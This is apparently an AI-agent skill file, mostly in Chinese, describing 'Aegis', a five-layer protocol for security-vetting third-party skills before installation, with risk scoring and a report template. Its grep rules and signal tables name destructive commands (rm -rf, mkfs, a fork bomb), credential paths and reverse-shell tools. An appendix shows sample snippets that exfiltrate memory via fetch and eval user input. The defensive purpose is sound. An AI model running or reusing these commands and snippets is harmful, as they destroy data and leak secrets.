---
name: Aegis
version: 2.0.0
description: Enterprise-grade security vetting protocol for AI agent skills. Automated threat detection, quantified risk scoring, and zero-trust code analysis.
author: WYF
aliases: ["skill-vetter", "天鉴", "tianjian", "security-vetter", "aegis-skill-vetter", "aegis"]
license: MIT
acceptLicenseTerms: true
---

# Aegis · Skill Security Vetting System 🛡️

> *"Aegis protects, Aegis decides."*

企业级 AI 代理技能安全审查协议。自动化威胁检测、量化风险评分、零信任代码分析。

---

## 🎯 核心定位

天鉴是一个**防御性安全技能**，用于在安装任何第三方技能前进行深度安全审查。它不是简单的检查清单，而是一套完整的**安全决策框架**。

### 设计原则

| 原则 | 说明 |
|------|------|
| 🛡️ **零信任** | 所有外部代码默认不可信，必须经过验证 |
| 📊 **量化评估** | 风险必须可量化、可比较、可追溯 |
| 🤖 **AI 优先** | 为 AI agent 设计，决策流程可被机器理解执行 |
| ⚡ **自动化** | 能自动检查的绝不依赖人工判断 |
| 📝 **可审计** | 所有审查结果必须可记录、可回溯 |

---

## 🚀 使用场景

### 必须使用天鉴的情况

- [ ] 从 ClawHub/skillhub 安装任何技能
- [ ] 从 GitHub/GitLab 克隆技能代码
- [ ] 其他 AI 代理推荐的技能
- [ ] 用户手动提供的技能文件夹
- [ ] 任何需要 `exec` 执行外部脚本的情况

### 可跳过的情况（需记录原因）

- [ ] OpenClaw 官方核心技能（已内置审查）
- [ ] 之前已审查过且代码未变更的技能
- [ ] 用户明确承担风险的内部开发技能

---

## 🔍 五层审查协议

### 第一层：来源信誉评估 (Source Reputation)

```
评估维度：
├── 来源类型 (Source Type)
│   ├── 官方仓库 (OpenClaw core) → 信任等级：高
│   ├── ClawHub/skillhub 认证技能 → 信任等级：中高
│   ├── GitHub 高星项目 (100+ stars) → 信任等级：中
│   ├── GitHub 低星/新项目 → 信任等级：低
│   └── 未知来源/直接文件 → 信任等级：极低
│
├── 作者信誉 (Author Reputation)
│   ├── 已知可信作者（历史技能无问题）→ +20 分
│   ├── 有社区评价/引用 → +10 分
│   ├── 首次出现/匿名 → 0 分
│   └── 有负面记录 → -50 分（直接拒绝）
│
├── 时间维度 (Temporal Signals)
│   ├── 最后更新时间 < 3 个月 → +10 分
│   ├── 最后更新 < 1 年 → 0 分
│   └── 最后更新 > 1 年 → -10 分（可能过时）
│
└── 社区指标 (Community Metrics)
    ├── 下载量/安装量 → 按对数计分
    ├── 用户评价/反馈 → 正面 + 负面加权
    └── Fork 数/衍生项目 → 活跃度指标
```

**自动化命令：**
```bash
# ClawHub/skillhub 技能信息
skillhub info <skill-name>

# GitHub 仓库统计
curl -s "https://api.github.com/repos/{owner}/{repo}" | jq '{
  stars: .stargazers_count,
  forks: .forks_count,
  updated: .updated_at,
  created: .created_at,
  issues: .open_issues_count
}'

# 检查作者历史技能
ls ~/.openclaw/workspace/skills/ | grep -i <author>
```

---

### 第二层：静态代码分析 (Static Code Analysis)

#### 🚨 立即拒绝的危险信号 (CRITICAL - 自动拒绝)

发现以下任意一项，**直接拒绝安装**，无需继续审查：

```bash
# 检查命令示例
grep -r "curl\|wget" --include="*.md" --include="*.sh" --include="*.js" --include="*.py" .
grep -r "exec(\|eval(" --include="*.js" --include="*.py" .
grep -r "base64.*decode\|atob(" --include="*.js" --include="*.py" .
grep -r "~/.ssh\|~/.aws\|~/.config\|credentials\|\.env" --include="*.md" --include="*.js" --include="*.py" .
grep -r "MEMORY.md\|SOUL.md\|USER.md\|IDENTITY.md" --include="*.md" --include="*.js" --include="*.py" .
grep -r "sudo\|pkexec\|doas" --include="*.md" --include="*.sh" .
grep -r "rm -rf\|dd if=\|mkfs\|:(){:|:&};:" --include="*.sh" .
grep -r "0x[0-9a-fA-F]\{8,\}" --include="*.js" --include="*.py"  # 混淆的十六进制
grep -r "javascript:.*eval\|data:text/html" --include="*.md" .  # XSS 向量
```

**危险信号清单：**

| 信号类型 | 检测模式 | 风险等级 | 说明 |
|---------|---------|---------|------|
| 数据外传 | `curl\|wget` + 未知域名 | ⛔ CRITICAL | 可能窃取数据 |
| 代码执行 | `eval(`, `exec(` | ⛔ CRITICAL | 动态执行恶意代码 |
| 编码混淆 | `base64.*decode`, `atob(` | ⛔ CRITICAL | 隐藏真实意图 |
| 凭证窃取 | `~/.ssh`, `~/.aws`, `credentials` | ⛔ CRITICAL | 窃取敏感信息 |
| 记忆访问 | `MEMORY.md`, `SOUL.md`, `USER.md` | ⛔ CRITICAL | 访问私有上下文 |
| 提权尝试 | `sudo`, `pkexec`, `doas` | ⛔ CRITICAL | 尝试获取更高权限 |
| 破坏命令 | `rm -rf /`, `dd if=`, `mkfs` | ⛔ CRITICAL | 破坏系统 |
| 混淆代码 | 长十六进制字符串、压缩代码 | ⛔ CRITICAL | 隐藏真实功能 |
| XSS 攻击 | `javascript:`, `data:text/html` | ⛔ CRITICAL | 浏览器攻击 |
| 反向 Shell | `bash -i`, `nc -e`, `python.*socket` | ⛔ CRITICAL | 建立后门 |

#### ⚠️ 需要人工审查的警告信号 (WARNING - 需解释)

```bash
# 检查命令示例
grep -r "fetch(\|axios\|http.*request" --include="*.js" --include="*.py" .
grep -r "fs.*write\|file.*write" --include="*.js" --include="*.py" .
grep -r "child_process\|subprocess\|spawn" --include="*.js" --include="*.py" .
grep -r "localStorage\|sessionStorage\|cookie" --include="*.js" .
grep -r "crypto\|encrypt\|decrypt" --include="*.js" --include="*.py" .
```

**警告信号清单：**

| 信号类型 | 检测模式 | 风险等级 | 需要解释的问题 |
|---------|---------|---------|---------------|
| 网络请求 | `fetch`, `axios`, `requests` | 🟡 WARNING | 访问哪些域名？用途是什么？ |
| 文件写入 | `fs.writeFile`, `open('w')` | 🟡 WARNING | 写入哪些文件？是否必要？ |
| 子进程 | `child_process`, `subprocess` | 🟡 WARNING | 执行什么命令？是否可替代？ |
| 存储访问 | `localStorage`, `cookie` | 🟡 WARNING | 存储什么数据？是否敏感？ |
| 加密操作 | `crypto`, `encrypt` | 🟡 WARNING | 加密什么？密钥如何管理？ |
| 环境变量 | `process.env`, `os.environ` | 🟡 WARNING | 读取哪些变量？是否必要？ |
| 定时任务 | `setInterval`, `cron`, `schedule` | 🟡 WARNING | 执行频率？是否会资源耗尽？ |
| 事件监听 | `process.on`, `signal` | 🟡 WARNING | 监听什么事件？是否有副作用？ |

---

### 第三层：权限范围分析 (Permission Scope Analysis)

```
权限矩阵：
┌─────────────────┬──────────┬──────────┬──────────┐
│ 权限类型        │ 只读     │ 读写     │ 执行     │
├─────────────────┼──────────┼──────────┼──────────┤
│ 工作区文件      │ 🟢 允许   │ 🟡 审查   │ 🟡 审查   │
│ 用户配置文件    │ 🔴 禁止   │ 🔴 禁止   │ 🔴 禁止   │
│ 系统文件        │ 🔴 禁止   │ 🔴 禁止   │ 🔴 禁止   │
│ 网络访问        │ 🟡 审查   │ N/A      │ 🟡 审查   │
│ 外部命令        │ N/A      │ N/A      │ 🔴 禁止*  │
└─────────────────┴──────────┴──────────┴──────────┘
* 除非技能明确需要且用户批准
```

**权限检查清单：**

```yaml
文件访问:
  - 读取范围：是否仅限工作区内？
  - 写入范围：是否创建新文件而非修改现有文件？
  - 敏感路径：是否触碰 ~/.*, /etc/, /var/ 等？

网络访问:
  - 目标域名：是否明确列出？
  - 协议：是否仅使用 HTTPS？
  - 数据流向：是读取还是上传？上传什么数据？

命令执行:
  - 命令列表：是否硬编码而非用户输入？
  - 参数来源：是否可能被注入？
  - 替代方案：是否可用内置 API 替代？
```

---

### 第四层：依赖链分析 (Dependency Chain Analysis)

```bash
# 检查 package.json / requirements.txt / Cargo.toml
cat package.json | jq '.dependencies'
cat requirements.txt
cat Cargo.toml | grep -A 50 '\[dependencies\]'

# 检查依赖是否有已知漏洞
npm audit 2>/dev/null || true
pip-audit 2>/dev/null || true
cargo-audit 2>/dev/null || true

# 检查依赖数量（过多依赖增加攻击面）
cat package.json | jq '.dependencies | length'
```

**依赖风险评估：**

| 依赖数量 | 风险等级 | 说明 |
|---------|---------|------|
| 0-5 个 | 🟢 低 | 依赖少，攻击面小 |
| 6-20 个 | 🟡 中 | 需要审查关键依赖 |
| 21-50 个 | 🟠 高 | 依赖过多，建议简化 |
| 50+ 个 | 🔴 极高 | 拒绝安装，要求重构 |

**依赖来源检查：**
- [ ] 所有依赖来自官方仓库（npm/pypi/crates.io）
- [ ] 无 git 直连依赖（`git+https://...`）
- [ ] 无本地路径依赖（`file:...`）
- [ ] 无未知源依赖

---

### 第五层：行为意图分析 (Behavioral Intent Analysis)

**核心问题：** 这个技能的实际行为是否与其声明的用途一致？

```
一致性检查：
├── 功能声明 vs 实际代码
│   ├── 声明"只读天气 API" → 实际只有 fetch 天气接口 ✓
│   └── 声明"文件管理" → 实际有网络请求 ✗ 不一致！
│
├── 最小权限原则
│   ├── 是否请求了不必要的权限？
│   └── 是否有更安全的替代实现？
│
└── 副作用分析
    ├── 是否有未声明的副作用（如修改全局状态）？
    └── 是否有持久化行为（如写入配置文件）？
```

---

## 📊 风险评分系统

### 量化评分模型

```
基础分：100 分

扣分项：
├── 来源信誉
│   ├── 未知作者：-20 分
│   ├── 无社区评价：-10 分
│   └── 超过 1 年未更新：-10 分
│
├── 代码警告信号（每个）
│   ├── 网络请求未说明目标：-5 分
│   ├── 文件写入未说明范围：-5 分
│   ├── 使用子进程：-10 分
│   └── 加密操作：-5 分
│
├── 依赖风险
│   ├── 依赖数量 > 20：-10 分
│   ├── 有已知漏洞依赖：-20 分/个
│   └── 非官方源依赖：-15 分/个
│
└── 行为不一致
    ├── 功能与代码不符：-30 分
    └── 有未声明副作用：-20 分

加分项：
├── 开源许可证（MIT/Apache/BSD）：+10 分
├── 有完整测试覆盖：+10 分
├── 有文档和示例：+5 分
└── 作者响应 issue 积极：+5 分
```

### 风险等级划分

| 分数范围 | 风险等级 | 标识 | 决策 |
|---------|---------|------|------|
| 80-100  | 低风险 | 🟢 | 自动批准安装 |
| 60-79   | 中风险 | 🟡 | 需人工审查后决定 |
| 40-59   | 高风险 | 🟠 | 强烈不建议，需明确理由 |
| 0-39    | 极高风险 | 🔴 | 禁止安装 |
| 任何 CRITICAL 信号 | 拒绝 | ⛔ | 直接拒绝，不评分 |

---

## 📋 审查报告模板

```
╔══════════════════════════════════════════════════════════╗
║           天鉴 · 技能安全审查报告                         ║
║            TIANJIAN SECURITY VETTING REPORT              ║
╠══════════════════════════════════════════════════════════╣
║ 审查 ID: TJ-{{YYYYMMDD}}-{{HHMMSS}}-{{随机 4 位}}              ║
║ 审查时间：{{ISO8601 时间戳}}                                  ║
║ 审查代理：{{Agent 名称/ID}}                                  ║
╚══════════════════════════════════════════════════════════╝

【技能信息】
├── 技能名称：{{skill-name}}
├── 声 明 版 本：{{version}}
├── 声 明 作 者：{{author}}
├── 来    源：{{ClawHub / GitHub URL / 其他}}
├── 声 明 用 途：{{description}}
└── 许 可 证：{{license}}

【来源信誉评估】
├── 来源类型：{{官方/认证/社区/未知}}
├── 作者历史：{{已知可信/首次出现/有负面记录}}
├── 社区指标：{{stars/downloads/forks}}
├── 最后更新：{{last-updated}}
└── 信誉得分：{{X}}/{{100}}

【代码审查结果】
├── 文件总数：{{count}}
├── 代码行数：{{LOC}}
├── CRITICAL 信号：{{数量}} - {{列表或"无"}}
├── WARNING 信号：{{数量}} - {{列表或"无"}}
└── 代码混淆检测：{{通过/失败}}

【权限范围分析】
├── 文件访问：{{只读工作区/读写工作区/访问敏感文件}}
├── 网络访问：{{无/仅读取/可上传数据}}
├── 命令执行：{{无/有限命令/任意命令}}
└── 最小权限原则：{{符合/不符合}}

【依赖链分析】
├── 依赖数量：{{count}}
├── 依赖来源：{{全部官方/混合/未知源}}
├── 已知漏洞：{{数量}} - {{CVE 列表或"无"}}
└── 依赖风险：{{低/中/高}}

【行为一致性】
├── 声明 vs 实际：{{一致/部分一致/不一致}}
├── 未声明副作用：{{无/有 - 详细说明}}
└── 可替代方案：{{有/无}}

【风险评分】
├── 基础分：100
├── 扣分项：-{{X}}
├── 加分项：+{{Y}}
├── 最终得分：{{Z}}/{{100}}
└── 风险等级：{{🟢低/🟡中/🟠高/🔴极高}}

【审查结论】
╔══════════════════════════════════════════════════════════╗
║  决    策：{{✅ 批准安装 / ⚠️ 谨慎安装 / ❌ 拒绝安装}}           ║
║  置信度：{{高/中/低}}                                       ║
║  审查员：{{AI/人工}}                                        ║
╚══════════════════════════════════════════════════════════╝

【审查员备注】
{{自由文本：任何需要说明的观察、疑虑或建议}}

【审计追踪】
├── 审查日志：{{log-file-path}}
├── 代码快照：{{snapshot-path}}
└── 复查期限：{{建议复查日期}}
```

---

## 🤖 AI Agent 集成指南

### 快速决策树

```
开始审查
    │
    ▼
是否有 CRITICAL 信号？
    ├── 是 → 输出拒绝报告，终止
    │
    └── 否 → 继续
            │
            ▼
        计算风险评分
            │
            ▼
        分数 >= 80？
            ├── 是 → 输出批准报告，可安装
            │
            └── 否 → 分数 >= 60？
                    ├── 是 → 输出谨慎报告，需人工确认
                    │
                    └── 否 → 输出拒绝报告，不建议安装
```

### 自动化审查脚本

```bash
#!/bin/bash
# 天鉴自动化审查入口脚本

SKILL_PATH="$1"
REPORT_DIR="./vetting-reports"

if [ -z "$SKILL_PATH" ]; then
    echo "用法：tianjian-vet.sh <skill-path>"
    exit 1
fi

mkdir -p "$REPORT_DIR"
REPORT_FILE="$REPORT_DIR/vet-$(date +%Y%m%d-%H%M%S).md"

echo "🔱 天鉴安全审查启动..."
echo "目标：$SKILL_PATH"
echo ""

# 第一层：来源检查
echo "📍 第一层：来源信誉评估..."
# ... 实现来源检查逻辑

# 第二层：静态分析
echo "🔬 第二层：静态代码分析..."
# ... 实现静态分析

# 第三层：权限分析
echo "🔐 第三层：权限范围分析..."
# ... 实现权限分析

# 第四层：依赖分析
echo "📦 第四层：依赖链分析..."
# ... 实现依赖分析

# 第五层：行为分析
echo "🎯 第五层：行为意图分析..."
# ... 实现行为分析

# 生成报告
echo "📝 生成审查报告..."
# ... 生成报告

echo "✅ 审查完成，报告：$REPORT_FILE"
```

### 与技能安装流程集成

```yaml
# 在技能安装流程中插入天鉴检查
skill-install-flow:
  pre-install:
    - run: tianjian-vet {{skill-name}}
      check: exit_code == 0
      on_failure:
        - show_report: true
        - require_user_confirm: true
  
  install:
    - run: skillhub install {{skill-name}}
  
  post-install:
    - run: tianjian-audit {{skill-name}}  # 安装后验证
```

---

## 📚 附录

### A. 常见安全模式识别

**数据外传模式：**
```javascript
// 可疑模式
fetch('https://unknown-domain.com/api', {
  method: 'POST',
  body: JSON.stringify({ memory: context.memory })
})
```

**凭证窃取模式：**
```python
# 可疑模式
import os
aws_key = os.environ.get('AWS_SECRET_ACCESS_KEY')
# 然后发送到外部...
```

**代码注入模式：**
```javascript
// 可疑模式
const userInput = getUserInput();
eval(userInput);  // 直接执行用户输入
```

### B. 安全编码最佳实践

**推荐模式：**
```javascript
// ✅ 好的做法：明确的 API 调用，无动态执行
const weather = await fetch('https://api.weather.gov/...');
const data = await weather.json();

// ✅ 好的做法：文件操作限制在工作区
const notePath = path.join(workspaceRoot, 'notes', filename);
await fs.writeFile(notePath, content);
```

### C. 审查频率建议

| 技能类型 | 审查频率 |
|---------|---------|
| 核心技能 | 每次更新 |
| 高频使用技能 | 每月复查 |
| 低频技能 | 每季度复查 |
| 有警告信号技能 | 每次使用前 |

### D. 紧急响应流程

发现已安装技能存在安全问题：

1. **立即隔离** - 禁用技能，阻止其执行
2. **影响评估** - 检查是否有数据泄露或系统修改
3. **溯源分析** - 确定问题引入时间点和原因
4. **修复/卸载** - 修复问题或完全移除技能
5. **报告记录** - 记录事件到审查日志
6. **流程改进** - 更新审查规则防止类似问题

---

## 🔱 天鉴箴言

> **「代码如人心，不可轻信」**
> 
> 每一次安装都是一次信任的授予。
> 天鉴的存在，不是阻碍创新，而是守护边界。
> 
> 在便利与安全之间，我们选择安全。
> 在速度与审慎之间，我们选择审慎。
> 
> 因为一次疏忽，可能代价惨重。
> 而多一次审查，只是片刻等待。

---

## 📄 License

This skill is licensed under the **MIT License**.

```
MIT License

Copyright (c) 2026 Aegis Skill Vetter

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
```

---

*天鉴 · 版本 2.0.0 · 为 AI 代理而生的安全审查系统*

🔱 **天鉴高悬，万邪不侵** 🔱